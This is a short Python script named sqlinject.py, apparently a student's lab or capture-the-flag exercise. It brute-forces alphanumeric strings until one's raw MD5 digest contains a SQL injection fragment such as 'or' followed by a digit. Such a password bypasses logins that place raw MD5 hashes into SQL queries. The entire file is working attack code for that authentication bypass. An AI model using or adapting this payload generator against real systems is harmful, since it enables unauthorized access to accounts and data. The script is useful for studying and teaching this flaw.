#rwking2 and xhlu15
#sqlinject.py
#iterative search through length specified

from pymd5 import md5
import re
import itertools

def testString(regex, inputTest):
    h = md5()
    h.update(inputTest)
    d = str(h.digest())
    if re.search( regex, d, re.I | re.S ):
        print ("Input string is: " + inputTest)
        print ("Output digest is: " + d)
        return True
    else:
        return False

def main():
    choices = "abcdefghijklmnopqrstuvwxyz0123456789"
    regex = ".*\'((or)|(\|\|))\'[1-9]"
    gen = itertools.combinations_with_replacement(choices,32)
    for string in gen:
        string = ''.join(string)
        print string
        if(testString(regex, string)):
            break
        

if __name__=='__main__':
    main()
